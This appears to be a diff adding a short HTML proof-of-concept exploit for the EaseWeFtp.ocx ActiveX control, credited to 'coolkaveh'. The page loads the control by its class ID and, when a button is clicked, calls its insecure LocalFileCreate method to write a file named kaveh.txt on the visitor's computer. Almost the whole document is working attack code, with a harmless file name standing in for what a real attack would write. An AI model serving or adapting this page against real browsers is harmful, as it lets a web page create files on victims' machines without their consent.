@@ -1,0 +1,25 @@
+<HTML>
+Easewe FTP(EaseWeFtp.ocx) Insecure Method Exploit<br>
+<br>
+Description There is Insecure Method in (LocalFileCreate) fonction<br>
+Found By : coolkaveh<br>
+
+<title>Exploited By : coolkaveh </title>
+<BODY>
+ <object id=cyber
+classid="clsid:{31AE647D-11D1-4E6A-BE2D-90157640019A}"></object>
+
+<SCRIPT>
+
+function Do_it()
+ {
+     File = "kaveh.txt"
+   cyber.LocalFileCreate(File)
+ }
+
+</SCRIPT>
+<input language=JavaScript onclick=Do_it() type=button value="Click
+here To Test"><br>
+</body>
+</HTML>
+
